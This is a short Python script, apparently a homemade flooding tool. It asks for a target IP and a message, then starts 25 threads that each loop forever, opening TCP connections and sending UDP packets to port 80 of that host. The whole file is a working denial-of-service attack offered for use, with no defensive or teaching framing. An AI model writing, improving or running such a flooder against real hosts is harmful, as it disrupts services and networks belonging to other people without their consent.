import threading
import time
import socket

#set ip address and port here
ipaddr = input("Enter Ip: ")
port = 80

#send a messge in those packets if you would like
msg = input("Message: ")

#how many threads
threadcount = 25

#function that sends a tcp packet to the specified ip and port
def sendittcp():
    bytemsgtcp = bytes(msg, "utf-8")
    socktcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socktcp.connect((ipaddr, port))
    socktcp.send(bytemsgtcp)
    print("tcp packet sent")

#function that send a udp packet to the specified ip and port
def senditudp():
    bytemsgudp = bytes(msg, "utf-8")
    sockudp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sockudp.connect((ipaddr, port))
    sockudp.send(bytemsgudp)
    print("udp packet sent")

#function that sends both a udp and tcp packet
def lmfao():
    #puts it in a loop
    while True:
        #sends a tcp packet
        sendittcp()
        #wait half a second
        time.sleep(0.3)
        #send a udp packet
        senditudp()
        #wait half a second and continue the loop
        time.sleep(0.3)


#thread stuff here
threads = []

for i in range(threadcount):
    th = threading.Thread(target=lmfao)
    th.daemon = True
    threads.append(th)

for i in range(threadcount):
    threads[i].start()

for i in range(threadcount):
    threads[i].join() 